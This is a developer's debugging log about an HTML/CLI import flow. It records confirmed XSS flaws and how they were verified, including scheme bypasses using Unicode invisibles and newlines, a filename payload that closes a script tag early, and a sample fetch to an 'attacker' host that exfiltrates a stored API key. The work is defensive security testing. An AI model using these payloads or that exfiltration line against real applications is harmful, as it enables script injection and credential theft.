# 2026-05-24 — Scenario sweep then debug pass on the import flow; found the markdown XSS the May 20 pass missed

Two-stage session on `service/public/import.html` and `cli/src/import.mjs`. First half was a 50-iteration `/autoresearch:scenario` sweep — stress-test the import flow, Product/UX domain, deep depth. I picked "PDF/DOCX/CSV import to a fresh container" as the seed because it's the most user-facing surface and the May 20 autonomous hunt had explicitly said the mammoth sanitizer "survived everything I threw at it." Worth re-prodding. Second half, the next morning, was `/autoresearch:debug --scope service/public/import.html` against the four critical predictions the scenarios surfaced. The chain mattered — the scenarios gave the debug pass a falsifiable catalog instead of a blank page.

The scenario sweep went smoothly. I read `cli/src/import.mjs` and `service/public/import.html` carefully first, then `service/server.js` to pin the actual `MAX_BODY_BYTES = 25 MiB` and `RATE_LIMIT_PER_HOUR = 10` constants so I wasn't making up numbers. Drafted 50 scenarios across 13 dimensions in one writing pass — 4 critical, 8 high, 24 medium, 14 low. The critical class was four security findings, all in the splice path: docx `javascript:` href (scenario #14), zero-width-space scheme bypass (#15), SVG-via-data-image (#16), and markdown inline HTML (#18). Wrote `scenarios.md`, `edge-cases.md`, `summary.md`, and a 50-row TSV log to `scenario/260522-1427-import-stress-ux/`. Stopped there for the day. The whole thing was forecasting, not evidence — every "critical" was a hypothesis.

Picked it up the next morning with `/autoresearch:debug`. Plan was simple: verify each of the four critical predictions with code-level evidence and a minimal Node repro, then pattern-search the file for related bugs the scenarios missed. The first thing I did was read `seeds/rewritable.html` to find how INLINE_DOC gets injected — that's the load-bearing context for every XSS class finding. Found `m.innerHTML = html` at line 849. And then the surprise: lines 850-855 explicitly walk through `m.querySelectorAll('script')` and re-create each script with `document.createElement('script')` so they execute. This is intentional — rwa documents are allowed to ship JS — but it means an imported `<script>` tag also runs on container open. Markdown XSS isn't just `<img onerror>`; bare `<script>alert(1)</script>` in a `.md` file is a turn-key payload. The scenario had said this was critical; the seed re-creation loop made it worse than the scenario claimed.

Then went hypothesis by hypothesis with Node REPL probes. The plain `javascript:` href regex actually works — five classic schemes (javascript, vbscript, file, https, mailto) all stripped or passed correctly. So scenario #14 in its plain form was DISPROVEN; the regex does its job. But #15 was where it got interesting. Tested six variants. JS `\s` matches U+FEFF and U+00A0 but NOT U+200B (zero-width space), U+00AD (soft hyphen), or U+202E (RLO) — those are Other_Format class, not Whitespace. So all three bypass scheme detection. The control char U+0001 also bypasses, AND `new URL("javascript:alert(1)")` returns protocol `javascript:` — the WHATWG URL parser strips control chars before scheme detection but our regex doesn't. Same story for `java\nscript:alert(1)` — newline-in-scheme bypasses the regex and the URL parser strips the newline. Two unambiguous exploits, four browser-dependent. The mammoth sanitizer that "survived everything" in the May 20 hunt didn't survive Unicode invisibles.

Scenario #16 (SVG-via-data-image) was the inverse surprise: the allow-list does pass `data:image/svg+xml` because it trusts the MIME label, but `<img src=…>` runs SVG in image-loading mode per HTML spec — no script, no animation, no external refs. Browser sandbox saves us. Disproven as exploitable today; documented in eliminated.md as latent (if a future feature renders SVG via innerHTML, the allow-list becomes inadequate).

After the four predictions, started pattern-searching. Found a fresh one I hadn't predicted: `escapeJsString` (used for the `FILE:` substitution in `applyTitleAndFileSubs`) only escapes `\` and `'`. It doesn't handle `</script>` the way `escapeTL` does. Linux and macOS both allow `<` and `>` in filenames. A file named `evil</script><svg onload=alert(1)>.md` produces a bootstrap line `FILE: 'evil</script><svg onload=alert(1)>.html'` — the `</script>` closes the bootstrap `<script>` tag early, and the rest is parsed as HTML. Verified with `/tmp/test-filename-xss.mjs`. Same flaw in `cli/src/seed.mjs:1366`. The CLI is more exploitable because `rwa import <path>` accepts arbitrary strings; the browser is harder to exploit but the produced container is just as dangerous to share. Filed as M1 in findings.

Also found two minor things during pattern search. The browser's `convertCsv` returns `warnings: []` unconditionally despite a comment claiming "errors are kept as warnings, matching the CLI's behavior" — comment-vs-code drift; the CLI does it right, the browser silently swallows Papa errors. And `renderShareSuccess` calls `new Date(expiresAt).toISOString()` with no try/catch — RangeError on invalid input bubbles up as an unhandled promise rejection, leaving the UI stuck. Both LOW. And confirmed scenario #25 at the CSS level: `.drop.busy` only sets opacity and cursor, no `pointer-events: none`, so the UX "busy" state doesn't actually prevent re-entrant imports.

The biggest cross-cutting find was no CSP anywhere. Not in the seed `<meta>`, not in server response headers. Multiplies the impact of every XSS — an injected `<script>` can `fetch('https://attacker/?k='+sessionStorage.rwa_apikey)` and exfiltrate the OpenRouter API key with no restriction. Architectural — the seed's inline scripts mean any CSP needs `script-src 'unsafe-inline'` — but a `connect-src` whitelist would still meaningfully reduce exfiltration. Filed as C3 with a note that it needs an architecture discussion before code.

Wrapped up with `findings.md` (9 confirmed bugs, full evidence + minimal repros + suggested fixes), `eliminated.md` (7 disproven hypotheses preserved so a future hunt doesn't re-walk them, including the SVG-as-img one that's "safe today, latent if rendering changes"), TSV log, summary. The summary recommends `/autoresearch:fix --from-debug` to land C1 (markdown XSS) and H1 (status `role="status"` — one-attribute WCAG fix) as surgical first cuts.

Two things carry forward. First, the May 20 entry said regex-based checks drift from DOM/parser truth; today added an unambiguous example — the mammoth sanitizer that "survived everything" was bypassable by Unicode invisibles and newline-in-scheme, both of which the WHATWG URL parser handles correctly. The right fix for `_attrIsSafe` is to use `new URL()` itself, the same parser the browser will use to navigate. Second — and this was the methodology insight — predict first, then verify works better than either alone. Half the value of the 50-scenario sweep was that the debug pass started with a catalog of falsifiable hypotheses instead of an empty file. The debug pass alone would have spent its budget on reconnaissance; the scenarios alone were just forecasts. Chaining them produced higher-quality findings than either would have, and the disproofs (E1, E2) were as informative as the confirmations.
